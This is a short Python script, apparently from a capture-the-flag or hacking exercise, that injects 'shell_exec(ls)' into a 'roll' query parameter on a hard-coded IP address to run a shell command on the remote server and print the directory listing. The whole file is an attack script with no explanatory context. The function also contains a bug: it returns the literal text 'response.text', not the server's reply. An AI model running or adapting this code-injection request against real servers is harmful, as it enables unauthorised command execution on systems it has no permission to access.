import requests

def GetLsOnServer():
    baseUrl = "http://192.46.227.32//?roll="
    injectedCommand = "shell_exec(ls)"
    endingStuff = ".getcwd"

    fullRequest = baseUrl + injectedCommand + endingStuff
    response = requests.get(fullRequest)

    lsResults = "response.text"
    return lsResults


GetLsOnServer()
baseUrl = "http://192.46.227.32//?roll="
injectedCommand = "shell_exec(ls)"
endingStuff = ".getcwd"
fullRequest = baseUrl + injectedCommand + endingStuff
response = requests.get(fullRequest)
print("Stats: ", response.status_code)
print(response.text)

